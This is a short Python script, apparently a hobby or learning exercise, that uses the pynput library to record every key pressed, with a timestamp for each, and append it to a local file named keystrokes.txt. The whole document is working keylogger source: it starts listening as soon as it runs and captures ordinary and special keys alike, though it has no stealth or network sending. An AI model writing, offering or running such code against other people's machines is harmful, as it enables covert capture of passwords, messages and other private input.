from pynput import keyboard
from datetime import datetime # for timestamp

output = "keystrokes.txt" # define file path name where it gets written

def on_press(key):
  timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 

  with open(output, "a") as f: # 'a' = append
    try:
      f.write(f"[{timestamp}]: {key.char}\n") # normal keys
    except AttributeError: # attribute errors are raised for non char keys
      f.write(f"[{timestamp}]: [{key.name}]\n") # this way special keys still print


# starts listening immediately
with keyboard.Listener(on_press=on_press) as listener:
  listener.join()
